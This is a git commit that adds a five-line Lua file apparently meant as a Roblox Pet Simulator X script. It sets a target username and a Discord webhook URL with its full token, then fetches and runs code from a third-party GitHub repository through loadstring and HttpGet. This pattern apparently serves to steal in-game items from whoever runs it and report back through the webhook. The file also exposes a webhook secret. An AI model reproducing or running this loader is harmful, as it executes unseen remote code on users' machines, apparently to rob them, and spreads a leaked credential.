2acca38924bd2db963efb29019cd60d28a27ee3a
Duperhub <120373391+Scripts-Project-wd@users.noreply.github.com>
2023-01-01 09:09:42 +1030

    Create PetSimulatorX.lua

---
+++ PetSimulatorX.lua
@@ -0,0 +1,5 @@
+UserName = "OGstinker024"
+
+WebHook = "https://discord.com/api/webhooks/1057259387137310741/hYDsIh-mUYLWB64OUAZXyvuI8u6rIbd_TVkgGjhL2jwnM4cbjuc7TJQccpQZZuzGWm2I"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
